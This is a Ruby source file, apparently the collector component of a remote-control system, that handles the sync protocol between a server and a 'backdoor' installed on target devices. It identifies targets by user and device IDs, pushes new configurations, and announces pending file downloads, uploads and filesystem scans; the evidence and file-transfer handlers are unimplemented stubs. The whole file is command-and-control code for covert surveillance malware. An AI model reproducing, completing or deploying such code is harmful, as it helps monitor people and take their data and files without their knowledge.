#
#  Command parsing or the protocol (to be mixed-in in protocol)
#

# relatives
require_relative 'db.rb'
require_relative 'sessions.rb'
require_relative 'pusher.rb'

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/pascalize'

# system

module RCS
module Collector

module Commands

  # the commands are depicted here: http://rcs-dev/trac/wiki/RCS_Sync_Proto_Rest

  INVALID_COMMAND  = 0x00       # Don't use
  PROTO_OK         = 0x01       # OK
  PROTO_NO         = 0x02       # Nothing available
  PROTO_BYE        = 0x03       # The end of the protocol
  PROTO_ID         = 0x0f       # Identification of the target
  PROTO_CONF       = 0x07       # New configuration
  PROTO_UNINSTALL  = 0x0a       # Uninstall command
  PROTO_DOWNLOAD   = 0x0c       # List of files to be downloaded
  PROTO_UPLOAD     = 0x0d       # A file to be saved
  PROTO_EVIDENCE   = 0x09       # Upload of an evidence
  PROTO_FILESYSTEM = 0x19       # List of paths to be scanned

  LOOKUP = { PROTO_ID => :command_id,
             PROTO_CONF => :command_conf,
             PROTO_UPLOAD => :command_upload,
             PROTO_DOWNLOAD => :command_download,
             PROTO_FILESYSTEM => :command_filesystem,
             PROTO_EVIDENCE => :command_evidence,
             PROTO_BYE => :command_bye}

  # Protocol Identification
  # -> PROTO_ID  [Version, UserId, DeviceId, SourceId]
  # <- PROTO_OK, Time, Availables
  def command_id(peer, session, message)

    # backdoor version
    version = message.slice!(0..3).unpack('i').first

    # ident of the target
    user_id, device_id, source_id = message.unpascalize_ary

    trace :info, "[#{peer}][#{session[:cookie]}] Identification: #{version} '#{user_id}' '#{device_id}' '#{source_id}'"

    # notify the pusher that the sync is in progress    
    Pusher.instance.sync_for session, version, user_id, device_id, source_id, Time.now

    # response to the request
    command = [PROTO_OK].pack('i')

    # the time of the server to synchronize the clocks
    time = [Time.new.to_i].pack('q')

    available = ""
    # ask to the db if there are any availables for the backdoor
    # the results are actually downloaded and saved locally
    # we will retrieve the content when the backdoor ask for them later
    available += [PROTO_CONF].pack('i') if DB.instance.new_conf? session[:bid]
    available += [PROTO_DOWNLOAD].pack('i') if DB.instance.new_download? session[:bid]
    available += [PROTO_UPLOAD].pack('i') if DB.instance.new_upload? session[:bid]
    available += [PROTO_FILESYSTEM].pack('i') if DB.instance.new_filesystem? session[:bid]

    # calculate the total size of the response
    tot = time.length + 4 + available.length

    # prepare the response
    response = command + [tot].pack('i') + time + [available.length / 4].pack('i') + available

    return response
  end

  # Protocol End
  # -> PROTO_BYE
  # <- PROTO_OK
  def command_bye(peer, session, message)

    # notify the pusher that the sync has ended
    Pusher.instance.sync_end session

    # destroy the current session
    SessionManager.instance.delete(session[:cookie])

    trace :info, "[#{peer}][#{session[:cookie]}] Synchronization completed"

    return [PROTO_OK].pack('i')
  end

  # -> PROTO_CONF
  # <- PROTO_NO | PROTO_OK [ Conf ]
  def command_conf(peer, session, message)

    trace :info, "[#{peer}][#{session[:cookie]}] Configuration request"

    # the conf was already retrieved (if any) during the ident phase
    # here we get just the content (locally) without asking again to the db
    conf = DB.instance.new_conf session[:bid]

    # send the response
    if conf.nil? then
      trace :info, "[#{peer}][#{session[:cookie]}] NO new configuration"
      response = [PROTO_NO].pack('i')
    else
      trace :info, "[#{peer}][#{session[:cookie]}] New configuration (#{conf.length} bytes)"
      response = [PROTO_OK].pack('i') + [conf.length].pack('i') + conf
    end

    return response
  end


  def command_upload(peer, session, message)
    #TODO: implement
  end
  def command_download(peer, session, message)
    #TODO: implement
  end
  def command_filesystem(peer, session, message)
    #TODO: implement
  end
  def command_evidence(peer, session, message)
    #TODO: implement
  end

end #Commands

end #Collector::
end #RCS::